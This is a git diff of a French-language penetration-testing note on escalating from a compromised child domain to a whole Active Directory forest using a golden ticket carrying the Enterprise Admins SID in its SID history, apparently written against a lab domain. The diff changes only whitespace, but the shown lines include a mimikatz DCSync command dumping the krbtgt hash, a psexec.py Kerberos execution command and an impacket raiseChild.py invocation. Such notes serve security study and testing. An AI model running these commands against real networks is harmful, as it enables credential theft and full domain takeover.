@@ -1,13 +1,14 @@
 ---
 public: true # set to true to make the article publishable
 ---
+
 Il s'agit d'une attaque offrant la possibilité de compromettre une forêt AD à partir d'un domaine compromis.
+
 Il s'appuie sur la création d'un golden ticket qui contiendra un SID history égal au SID du groupe de sécurité administrateur de l'entreprise.
 
 ## Prérequis
 
 - Disposer du Hash NTLM (LM:NT) du compte krbtgt du domaine enfant (récupérable via  `lsadump::dcsync /user:krbtgt@LOGISTICS.INLANEFREIGHT.LOCAL`)
-
 
 ## Attaque
 
@@ -81,7 +82,3 @@ psexec.py -k -no-pass <fake or real user>@<target FQDN> -dc-ip <dc ip> -target-i
 ```shell
 raiseChild.py <compromised domain FQDN>/<domain admin user>:<password> -target-exec <target ip>
 ```
-
-
-
-
